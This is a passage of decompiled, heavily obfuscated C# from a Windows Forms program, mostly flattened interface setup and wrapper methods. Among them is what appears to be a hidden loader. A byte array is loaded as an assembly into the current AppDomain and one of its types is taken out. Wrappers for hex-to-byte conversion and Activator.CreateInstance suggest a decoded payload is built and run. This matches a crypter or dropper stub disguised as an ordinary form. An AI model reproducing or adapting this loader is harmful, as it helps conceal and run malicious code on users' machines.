					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)(num2 * 39716647) ^ -1911485468;
					continue;
				case 25u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = (int)((num2 * 1243716238) ^ 0x7167B588);
					continue;
				case 24u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)(num2 * 1937160465) ^ -166354266;
					continue;
				case 23u:
					num = ((int)num2 * -1790892794) ^ -1458077764;
					continue;
				case 22u:
					num = (int)((num2 * 913920882) ^ 0x1D647E7C);
					continue;
				case 21u:
					num = ((int)num2 * -533679911) ^ 0x1BF57134;
					continue;
				case 20u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1024145312) ^ 0x194E3292);
					continue;
				case 19u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -2007699867) ^ -571309631;
					continue;
				case 18u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -1760781480) ^ -724814131;
					continue;
				case 17u:
					num = (int)((num2 * 957049984) ^ 0x1759F34C);
					continue;
				case 16u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 36525161) ^ 0x24EBCABF);
					continue;
				case 15u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = ((int)num2 * -1272141542) ^ 0x12AB6057;
					continue;
				case 14u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = ((int)num2 * -1651284235) ^ -421983328;
					continue;
				case 13u:
					num = (int)((num2 * 1012494195) ^ 0x6D3A4A08);
					continue;
				case 12u:
					num = ((int)num2 * -1392470491) ^ -737567632;
					continue;
				case 11u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -802980042) ^ -1203530135;
					continue;
				case 10u:
					flag = num3 < 22528;
					num = -2082620387;
					continue;
				case 9u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -360341173) ^ -1016549883;
					continue;
				case 8u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -210454963) ^ 0x79E7E146;
					continue;
				case 7u:
					num = ((int)num2 * -1076170143) ^ -39790288;
					continue;
				case 6u:
					num = (int)((num2 * 2079279851) ^ 0x476F5E90);
					continue;
				case 5u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -363106565) ^ -1156153114;
					continue;
				case 4u:
					num3++;
					num = (int)((num2 * 1993617103) ^ 0x493351F7);
					continue;
				case 3u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = (int)((num2 * 1514126898) ^ 0x1934CB2C);
					continue;
				case 2u:
					richTextBox1 = Form1.smethod_54();
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					num = (int)((num2 * 1448152505) ^ 0x5264F305);
					continue;
				case 0u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					sa = Veet.Sa;
					sa = Form1.smethod_34(sa, Veet.Xe);
					num = (int)(num2 * 40679890) ^ -1807130035;
					continue;
				default:
					return;
				case 62u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		PerformTable(q);
		while (true)
		{
			int num = 82425134;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x51CB9560u) % 3u)
				{
				case 1u:
					goto IL_000f;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_000f:
				num = ((int)num2 * -1841566752) ^ -1983538683;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 1475130415;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x412E61EBu) % 3u)
				{
				case 1u:
					goto IL_0003;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_0003:
				result = Form1.smethod_94(Form1.smethod_93(), Position);
				num = (int)((num2 * 1624215839) ^ 0x29478BE4);
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		while (true)
		{
			int num = -1472061972;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xE8D4CF61u) % 3u)
				{
				case 1u:
					goto IL_0003;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0003:
				ComMember = Form1.smethod_95(Q3)[24];
				num = (int)((num2 * 1588862085) ^ 0x16953338);
			}
		}
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
